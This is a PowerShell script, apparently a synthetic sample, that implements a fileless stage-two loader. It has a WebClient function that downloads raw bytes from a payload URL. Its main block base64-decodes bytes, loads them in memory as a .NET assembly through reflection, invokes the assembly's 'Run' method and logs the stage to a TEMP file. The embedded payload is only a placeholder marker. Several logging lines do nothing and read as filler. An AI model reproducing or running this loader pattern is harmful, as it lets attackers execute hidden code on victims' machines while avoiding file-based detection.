
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://localhost:8000/payload.bin",
    [string]$ActivityLog = "$env:TEMP\report.txt",
    [int]$TimeoutSec = 40
)
$ErrorActionPreference = "Stop"

function Get-StageAssemblyBytes {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [int]$TimeoutSec = 40
    )

    Write-Verbose ("Downloading assembly bytes from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    return $ClientObject.DownloadData($SourceUrl)
}

function Invoke-AssemblyEntryPoint {
    [CmdletBinding()]
    param(
        [object]$LoadedAssembly = $null
    )

    if ($null -eq $LoadedAssembly) {
        throw "Loaded assembly is null"
    }
    $Types = $LoadedAssembly.GetTypes()
    if ($Types.Length -gt 0) {
        $EntryMethod = $Types[0].GetMethod("Run")
        if ($null -ne $EntryMethod) {
            Write-Verbose "Invoking entry method"
            return $EntryMethod.Invoke($null, @())
        }
    }
    Write-Verbose "No conventional entry method found"
    return $null
}

try {
    Write-Verbose "Starting managed loader"
    $AssemblyBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpwNjViZHFrMWI3")
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($AssemblyBytes)
    $EntryResult = Invoke-AssemblyEntryPoint -LoadedAssembly $FetchResult
    Write-Verbose ("Entry result: " + $EntryResult)
}
catch {
    Write-Warning "Managed loader failed: $($_.Exception.Message)"
}

$AssemblyReport = [ordered]@{
    Stage = "reflection"
    ByteCount = $AssemblyBytes.Length
    Endpoint = $PayloadUrl
}
$AssemblyReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $ActivityLog -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Validating result"
Write-Verbose "Resolving configured target"
Write-Verbose "Inspecting process list"
Write-Verbose "Preparing working directory"
Write-Verbose "Checking local path"
Write-Verbose "Retry budget remaining"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Reading configuration values"
$ProgressPreference = "SilentlyContinue"
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
